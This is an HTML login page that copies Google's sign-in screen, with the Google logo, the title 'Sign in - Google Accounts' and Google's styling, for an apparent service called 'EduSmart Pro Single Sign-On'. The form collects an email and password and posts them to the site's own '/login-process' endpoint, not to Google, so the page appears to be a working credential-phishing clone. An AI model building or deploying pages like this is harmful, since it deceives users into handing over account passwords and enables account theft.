<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #202124;
        }
        .login-card {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: left;
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 16px;
        }
        .logo svg { width: 75px; height: 24px; }
        .heading {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            text-align: center;
            color: #202124;
            margin-bottom: 8px;
        }
        .subheading {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 0.1px;
            line-height: 1.5;
            text-align: center;
            color: #202124;
            margin-bottom: 32px;
        }
        .input-group {
            position: relative;
            margin-bottom: 16px;
        }
        .input-field {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-field:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .forgot-link {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
            display: inline-block;
            margin-bottom: 32px;
        }
        .forgot-link:hover { text-decoration: underline; }
        .info-text {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.4286;
            margin-bottom: 36px;
        }
        .info-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .info-text a:hover { text-decoration: underline; }
        .action-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-btn {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 9px 0;
        }
        .next-btn {
            background-color: #1a73e8;
            color: #ffffff;
            font-weight: 500;
            font-size: 14px;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            cursor: pointer;
            transition: background-color 0.2s, box-shadow 0.2s;
        }
        .next-btn:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
    </style>
</head>
<body>

    <div class="login-card">
        <!-- Official Google SVG Logo -->
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"></path>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"></path>
            </svg>
        </div>

        <h1 class="heading">Sign in</h1>
        <p class="subheading">to continue to EduSmart Pro Single Sign-On</p>

        <form action="/login-process" method="POST">
            <div class="input-group">
                <input type="email" name="email" class="input-field" placeholder="Email or phone" required>
            </div>
            
            <div class="input-group">
                <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
            </div>

            <a href="#" class="forgot-link">Forgot email?</a>

            <p class="info-text">
                Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
            </p>

            <div class="action-row">
                <button type="button" class="create-btn">Create account</button>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>

</body>
</html>
